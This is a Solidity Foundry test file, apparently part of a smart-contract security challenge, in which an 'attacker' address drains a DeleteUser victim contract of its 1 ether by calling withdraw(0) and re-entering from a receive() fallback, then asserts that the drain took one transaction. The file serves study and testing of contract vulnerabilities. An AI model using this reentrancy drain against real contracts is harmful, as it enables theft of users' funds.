// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DeleteUser} from "../src/DeleteUser.sol";

contract DeleteUserTest is Test {
    DeleteUser public victimContract;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        victimContract = new DeleteUser();
        victimContract.deposit{value: 1 ether}();
    }

    function testExploit() public {
        uint64 nonceBefore = vm.getNonce(attacker);

        vm.startPrank(attacker);
        //victimContract.deposit{value: 0}();
        victimContract.withdraw(0);
        vm.stopPrank();

        assertEq(address(victimContract).balance, 0, "Contract balance should be zero");
        assertEq(vm.getNonce(attacker) - nonceBefore, 1, "Must exploit in one transaction");
    }

    receive() external payable {
        if (address(victimContract).balance > 0) {
            vm.startPrank(attacker);
            victimContract.withdraw(0);
            vm.stopPrank();
        }
    }
}
